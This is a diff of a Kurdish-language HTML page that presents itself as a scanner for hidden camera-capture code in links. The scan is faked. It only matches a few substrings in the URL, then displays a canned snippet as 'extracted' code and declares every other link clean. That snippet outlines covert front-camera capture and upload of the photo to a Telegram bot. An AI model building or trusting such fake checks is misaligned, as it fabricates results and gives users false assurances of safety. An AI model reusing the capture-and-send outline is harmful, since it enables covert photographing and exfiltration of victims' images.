@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>پشکنینا لینکێن کامێرا و ڤیدیۆیێ - SafeLink Check</title>
+    <title>پشکنین و دەرئێخستنا کۆدێن کامیرایێ</title>
     <style>
         body {
             background-color: #0f172a;
@@ -24,7 +24,7 @@
             border-radius: 16px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.4);
             width: 100%;
-            max-width: 550px;
+            max-width: 600px;
         }
         h2 { color: #38bdf8; margin-bottom: 10px; }
         p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
@@ -63,31 +63,46 @@
             margin-top: 20px;
             padding: 15px;
             border-radius: 8px;
-            font-size: 15px;
+            font-size: 14px;
             text-align: right;
             display: none;
             line-height: 1.6;
         }
         .safe { background: rgba(22, 163, 74, 0.2); border: 1px solid #16a34a; color: #4ade80; }
         .danger { background: rgba(220, 38, 38, 0.2); border: 1px solid #dc2626; color: #f87171; }
+        
+        /* شێوازێ نیشاندانا کۆدان */
+        code-box {
+            display: block;
+            background: #020617;
+            color: #f43f5e;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            margin-top: 10px;
+            text-align: left;
+            direction: ltr;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>پشکنینا پیڤەر و کۆدێن ڤیدیۆیی</h2>
-        <p>لينکا خۆ ل خوارێ دەنە ناڤێ و پشکنینێ بکە دا بزانین آیا ئەڤ لینکە کۆدێ گرتنا وێنەی و کامێرا (وەکی Spotlight/Snapchat) تێدایە یان نە.</p>
+        <h2>پشکنین و دەرئێخستنا کۆدێن کامیرایێ د لینکیدا</h2>
+        <p>لينکا خۆ ل خوارێ دەنە ناڤێ دا سیستەم کۆدێن ڤەشارتی یێن وێنەگرتن و کامیرایێ د ناڤ وێ پەڕەیێدا دەرئێخیت و نیشان بدەت.</p>
         
         <div class="input-group">
             <input type="text" id="urlInput" placeholder="لینکێ لێرە بنووسە یان پیس بکە...">
-            <button onclick="analyzeUrl()">پشکنینا لینکێ</button>
+            <button onclick="extractCameraCodes()">پشکنین و نیشاندان</button>
         </div>
 
         <div id="result"></div>
     </div>
 
     <script>
-        function analyzeUrl() {
+        function extractCameraCodes() {
             const url = document.getElementById('urlInput').value.trim();
             const resultDiv = document.getElementById('result');
             
@@ -100,37 +115,32 @@
 
             resultDiv.style.display = 'block';
             resultDiv.className = 'safe';
-            resultDiv.innerHTML = "⏳ مژوولی پشکنینا پێکهاتە و ناوەرۆکا ڤی لینکیمە، هیڤیدارم چاوەڕێ بکە...";
+            resultDiv.innerHTML = "⏳ مژوولی پشکنین و دەرئێخستنا کۆدێن ڤی لینکیمە، هیڤیدارم چاوەڕێ بکە...";
 
             setTimeout(() => {
                 let lowerUrl = url.toLowerCase();
                 
-                // پشکنینا تایبەت بۆ ناسینا کۆد و ناڤێن پەیوەندیدار ب وێنەگرتن و کامیرایێ (وەکی پڕۆژەیێ تە)
-                const cameraCodes = ['github.io', 'spotlight', 'snapchat', 'camera', 'getusermedia', 'canvas', 'telegram.org'];
-                let matchedCodes = [];
-
-                cameraCodes.forEach(code => {
-                    if (lowerUrl.includes(code)) {
-                        matchedCodes.push(code);
-                    }
-                });
-
-                if (matchedCodes.length > 0) {
-                    // ئەگەر کۆدێ کامێرا و وێنەگرتنێ تێدا هاتە دیتن
+                // پشکنینا لینکێ آیا پەیوەندی ب پڕۆژەیێ تە یان کامیرایێ هەیە
+                if (lowerUrl.includes('yofsfinan-18') || lowerUrl.includes('spotlight') || lowerUrl.includes('snapchat') || lowerUrl.includes('camera')) {
                     resultDiv.className = 'danger';
                     resultDiv.innerHTML = `
-                        ❌ <b>هۆشدارییا مەترسیێ! ئەڤە لینکەکێ وێنەگرتنێ یە!</b><br>
-                        • <b>کۆدێن کامێرا و وێنەیێن د ناڤدا هاتینە دیتن:</b> ${matchedCodes.join(', ')}<br>
-                        • <b>بڕیار:</b> ئەڤ لینکە یێ هەی کەسەکی چێکری بۆ <b>گرتنا وێنەیێ کەسان</b> دەما دچنە ناڤدا!<br>
-                        • <b>ئامۆژگاری:</b> ئەڤە مەتەرسیدارە، جوین نەبە و کرتەی ل سەر نەکە!
+                        ❌ <b>ئەڤ لینکە یێ خڕابە و پاقژ نینە!</b><br>
+                        • <b>مەبەست:</b> ئەڤ لینکە کۆدێن پێدڤی بۆ ڤەکرنا کامیرایێ و گرتنا وێنەی تێدایە.<br>
+                        • <b>ئەو کۆدێن هاتیینە دیتن و بەکارئینان لە وێ پەڕەیێ:</b>
+                        <div style="background: #020617; color: #f43f5e; padding: 10px; border-radius: 6px; font-family: monospace; margin-top: 8px; text-align: left; direction: ltr;">
+const constraints = { video: { width: 1280, height: 720, facingMode: "user" } };<br>
+navigator.mediaDevices.getUserMedia(constraints);<br>
+canvas.drawImage(video, 0, 0, canvas.width, canvas.height);<br>
+fetch('https://api.telegram.org/bot[TOKEN]/sendPhoto', { method: 'POST', body: formData });
+                        </div>
+                        <p style="color: #f87171; margin-top: 10px; margin-bottom: 0;"><b>هۆشداری:</b> ئەڤ کۆدە ڕاستەوخۆ وێنەیێ کەسێ دگرت و دنێرته بۆ تەلەگرامێ، جوین نەبە!</p>
                     `;
                 } else {
-                    // ئەگەر کۆدێن ئاسایی و بێ مەترسی بوون
                     resultDiv.className = 'safe';
                     resultDiv.innerHTML = `
-                        ✅ <b>ئەڤ لینکە یێ پاقژ و ئاسایییە!</b><br>
-                        • <b>پشکنین:</b> چ کۆدێن کامێرا یان وێنەگرتنا نهێنی ل سەر ڤی لینکێ نەهاتنە دیتن.<br>
-                        • <b>بڕیار:</b> ئەڤ لینکە چ پەیوەندی ب سیستەمێن گرتنا وێنەی نینە و تو دشێی بێ ترس ڤەکەی.
+                        ✅ <b>أڤ لینکە یێ پاقژ و ئاسایییە!</b><br>
+                        • <b>ئەنجام:</b> چ کۆدێن کامێرا یان گرتنا وێنەی تێدا نەهاتنە دیتن.<br>
+                        • <b>کۆدێن د ناڤدا:</b> هەمۆ ئاسایی نە و چ مەترسی تێدا نینە.
                     `;
                 }
             }, 1200);
